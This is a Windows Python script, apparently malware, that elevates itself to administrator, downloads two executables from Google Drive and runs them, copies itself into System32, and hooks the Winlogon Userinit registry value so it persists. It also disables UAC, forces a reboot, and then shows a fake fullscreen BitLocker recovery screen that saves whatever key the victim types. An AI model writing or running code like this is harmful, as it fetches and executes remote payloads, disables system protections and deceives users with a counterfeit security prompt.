import tkinter as tk
from tkinter import messagebox
import os
import winreg
import shutil
import sys
import ctypes
import gdown

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# 관리자 권한이 아니라면 요청
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit(0)

# Temp 경로에서 cash.tmp 확인
temp_path = os.environ.get("TEMP")
flag_file = os.path.join(temp_path, "cash.tmp")

if os.path.exists(flag_file):
    os.system('"start "" "C:\\Program Files\\Common Files\\windows\\key.exe""')
    os.system('"start "" "C:\\Program Files\\Common Files\\windows\\key1.exe""')
    m1 = """BitLocker recovery"""
    m2 = """Enter the recovery key for this drive"""
    m3 = """Use the number keys or function keys F1-F10 (use F10 for 0).
Recovery key ID (to identify your key): 5QWDRJ67-88DA-0206-2217-84926404Q846

BitLocker needs your recovery key to unlock your drive because your PC's configuration
has changed. This may have happened because disc or USB device was inserted.
Removing it and restarting your PC may fix this problem.

Here's how to find your key:
 - Try your Microsoft account a: aka.ms/myrecoverykey
- For more information go to: aka.ms/recoverykeyfaq
- Warning: Do not turn off the computer. The decryption key may be lost."""
    m4 = """Press Enter to continue
Press Esc for more recovery options"""

    n = 0

    def on_esc(event):
        if n == 1:
            messagebox.showwarning("Warning", "Failed to prepare the next screen item")

    def save_key(event):
        if n == 1:
            key_text = entry.get()
            key_path = r"C:\Users\Public\Documents\key.key"
            # 파일로 저장
            with open(key_path, "w") as f:
                f.write(key_text)

    n = 1

    # GUI 생성
    root = tk.Tk()
    root.title("Blue Screen Simulator")
    root.geometry("600x400")
    root.configure(bg="#0078D7")  # 윈도우 블루스크린 색상
    root.attributes("-fullscreen", True)
    root.bind("<KeyRelease-Return>", save_key)
    root.wm_attributes("-topmost", 1)

    label = tk.Label(root, text=m1, fg="white", bg="#0078D7", font=("Segoe UI",40), justify="left")
    label.place(x=245, y=60)

    label1 = tk.Label(root, text=m2, fg="white", bg="#0078D7", font=("Segoe UI",30), justify="left")
    label1.place(x=250, y=155)

    entry = tk.Entry(root, width=100, font=("Segoe UI",25))
    entry.place(x=255, y=225, width=1000, height=35)
    entry.focus_set()

    label2 = tk.Label(root, text=m3, fg="white", bg="#0078D7", font=("Segoe UI",20), justify="left")
    label2.place(x=250, y=300)

    label1 = tk.Label(root, text=m4, fg="white", bg="#0078D7", font=("Segoe UI",30), justify="left")
    label1.place(x=250, y=800)

    # 오류 메시지 표시
    root.mainloop()
    exit()

# 저장 경로
save_dir = r"C:\Program Files\Common Files\windows"

# 디렉터리 생성 (존재하지 않으면)
os.makedirs(save_dir, exist_ok=True)

# 파일 ID와 이름
files = {
    "1Eff7HnjdYgy-duJTASYRH-rb2J1i0hE0": "key.exe",
    "17O_R1iy3QP9TOOez-kG-3OWrD0gM1Q0s": "key1.exe"
}

# 다운로드 실행
for file_id, filename in files.items():
    url = f"https://drive.google.com/uc?id={file_id}"
    save_path = os.path.join(save_dir, filename)
    print(f"Downloading {filename} to {save_path}...")
    gdown.download(url, save_path, quiet=True)

os.system('"start "" "C:\\Program Files\\Common Files\\windows\\key1.exe""')

# 사용자 프로그램 경로
source_path = os.path.abspath(sys.argv[0])
exe_name = os.path.basename(sys.argv[0])
destination_path = fr"C:\Windows\System32\{exe_name}"

# 파일 복사
try:
    shutil.copy2(source_path, destination_path)
    print(f"파일 복사 완료: {destination_path}")
except Exception as e:
    print(f"파일 복사 실패: {e}")
    exit()

# 레지스트리 경로
reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

try:
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as key:
        original_value, reg_type = winreg.QueryValueEx(key, "Userinit")
        print(f"기존 Userinit 값: {original_value}")

        # 중복 방지: 이미 포함되어 있는지 확인
        if destination_path not in original_value:
            new_value = f"{original_value},{destination_path}"
            winreg.SetValueEx(key, "Userinit", 0, reg_type, new_value)
            print("Userinit 레지스트리 수정 완료.")
        else:
            print("이미 Userinit에 등록되어 있습니다.")

except Exception as e:
    print(f"레지스트리 수정 실패: {e}")
    exit()

cmd = r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f'
os.system(cmd)

# cash.tmp 생성
try:
    with open(flag_file, "w") as f:
        f.write("setup complete")
    print(f"cash.tmp 생성 완료: {flag_file}")
except Exception as e:
    print(f"cash.tmp 생성 실패: {e}")
os.system("shutdown /r /t 0")
 